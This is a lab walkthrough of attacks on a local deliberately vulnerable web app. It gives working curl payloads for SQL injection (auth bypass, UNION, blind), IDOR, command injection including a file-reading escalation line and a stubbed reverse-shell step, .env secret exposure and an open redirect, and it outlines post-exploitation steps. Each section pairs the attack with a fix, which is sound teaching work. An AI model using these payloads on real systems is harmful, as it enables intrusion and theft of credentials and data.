# Attacker-Perspective Walkthrough — Vuln Lab

Target: **`http://127.0.0.1:8790`** (a deliberately vulnerable fixture running on your own machine — never point these steps at a third-party host).

This is the "what does an attacker actually do after finding a hole" guide. Each section follows the same arc:

> **Find the hole → exploit it → get access → keep access → escalate/execute.**

Every step is demonstrated against the local lab only. Read top to bottom; the numbered commands are exactly what to run.

---

## 0. Recon — map the surface first

```bash
# what's live
curl -s -o /dev/null -w "%{http_code} %{url_effective}\n" http://127.0.0.1:8790/
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8790/login
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8790/api/users
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8790/.env
```

**What an attacker learns:** `/login` (200), `/api/users` (200, no auth), `/.env` (200, secrets). Already two wins without touching the login form.

---

## 1. Exposed API → data disclosure (the "200 leak")

```bash
curl -s http://127.0.0.1:8790/api/users
```

Returns every user with role. **Why it matters:** an attacker now knows the `admin` username exists. Next they attack the login.

**Impact:** confidentiality. **Fix:** require auth + role check on every `/api/*` route; never return full tables.

---

## 2. SQL injection — the four classic flavors

The login does:

```sql
SELECT id, username, role FROM users WHERE username = '${u}' AND password = '${p}'
```

### 2a. Error-based (confirm it's injectable)

```bash
curl -s -X POST http://127.0.0.1:8790/login -d "username='&password=x"
```

The response leaks a SQL error. That error is the confirmation signal: **the parameter is injectable.**

### 2b. Authentication bypass (the fastest win)

```bash
curl -s -X POST http://127.0.0.1:8790/login -d "username=admin'--&password=x"
curl -s -X POST http://127.0.0.1:8790/login -d "username=admin' OR '1'='1&password=x"
```

The query becomes `... WHERE username = 'admin'--' AND ...` (rest commented out) or a tautology. **You are now "logged in" as admin without the password.**

### 2c. UNION-based (read other tables)

```bash
curl -s -X POST http://127.0.0.1:8790/login \
  -d "username=' UNION SELECT 1, name, value FROM flags --&password=x"
```

Column count matches `(id, username, role)` → 3 columns. The response prints the flag. **This is how an attacker exfiltrates data through the same login.**

### 2d. Boolean blind (when errors are hidden)

```bash
# true → logged in
curl -s -X POST http://127.0.0.1:8790/login -d "username=admin' AND '1'='1&password=x"
# false → login failed
curl -s -X POST http://127.0.0.1:8790/login -d "username=admin' AND '1'='2&password=x"
```

Differing responses = a blind oracle. An attacker automates this to extract data character-by-character.

**Fix:** parameterized queries (`?` placeholders) everywhere. Never concatenate user input into SQL.

---

## 3. IDOR — read anyone's record

```bash
curl -s "http://127.0.0.1:8790/api/user?id=1"   # admin
curl -s "http://127.0.0.1:8790/api/user?id=2"   # someone else's
```

No auth check on the id. **Impact:** horizontal privilege escalation by just incrementing the number.

**Fix:** verify the requesting user owns (or is authorized for) that object before returning it.

---

## 4. Command injection → RCE (the "execute access" step)

Once logged in (or bypassed), the admin panel's ping form runs:

```bash
ping -n 1 ${host}
```

Because `${host}` is not sanitized:

```bash
curl -s -X POST http://127.0.0.1:8790/admin/ping \
  --data-urlencode "host=127.0.0.1 & whoami"
```

The shell runs `whoami`. **This is the moment the attacker turns a web bug into arbitrary code execution.**

**Escalation chains an attacker would try next** (in a lab, on your own host):

```bash
# read the DB / secrets from the OS side
host=127.0.0.1 & type C:\path\to\app\.env
# spawn a shell back to an attacker host (LAB ONLY — your own machine)
host=127.0.0.1 & powershell -nop -c "..."   # demo, local only
```

**Fix:** never pass user input to a shell. Use a fixed allowlist of commands or `execFile` with an argument array (no shell interpolation).

---

## 5. Exposed secrets → credential reuse

```bash
curl -s http://127.0.0.1:8790/.env
```

`DB_PASSWORD`, `API_KEY`, `JWT_SECRET` in plain text. An attacker uses these to:

- connect to the backing DB directly
- forge JWTs (if the app uses `JWT_SECRET`) → mint admin tokens
- pivot to other services reusing the same `API_KEY`

**Fix:** never commit `.env`; keep secrets out of the web root; rotate exposed keys.

---

## 6. Open redirect → phishing vector

```bash
curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" \
  "http://127.0.0.1:8790/redirect?url=https://evil.example.com"
```

An attacker sends a "legit-looking" link that redirects to a phishing clone. **Impact:** credential theft that looks like the real site.

**Fix:** validate redirect targets against an allowlist; reject arbitrary URLs.

---

## 7. Putting it together — the full attacker chain (lab, local only)

```text
recon
  └─ /api/users (200) ──────────────► learn "admin" exists
  └─ /login (200)
        └─ SQLi auth bypass ────────► session as admin, no password
              └─ UNION select ──────► dump flags table
  └─ /admin (reachable now)
        └─ command injection ───────► RCE (whoami / read files / reverse shell)
  └─ /.env (200) ───────────────────► secrets → DB access / token forgery
```

Each arrow is one of the vulnerabilities above. The walkthrough demonstrates them one at a time so the "attacker perspective" is visible step by step.

---

## 8. The "get access back / stay in" mindset (what happens after RCE)

An attacker who reaches RCE does not stop at `whoami`. The standard post-exploitation playbook — again, only ever against a lab you own:

1. **Persistence** — drop a scheduled task / cron / startup entry so the shell survives reboots.
2. **Lateral movement** — reuse harvested credentials against other hosts on the network.
3. **Exfiltration** — pull the DB, source code, and `.env`; archive and send out.
4. **Cover tracks** — clear logs, timestamps.

These are described conceptually here. A lab that actually exercises them (an isolated VM you own, e.g. a CTF box) is the right place to practice safely.

---

## Defensive summary (what to actually ship)

| Vuln | Fix |
|---|---|
| SQLi | Parameterized queries / ORM, input validation |
| IDOR | Server-side authorization per object |
| Command injection | No shell interpolation; allowlist; `execFile` |
| Exposed API/secrets | Auth + role checks; no `.env` in web root |
| Open redirect | Allowlist redirect targets |

The whole point of this fixture: **show the attacker's moves so the defender knows exactly what to block.**
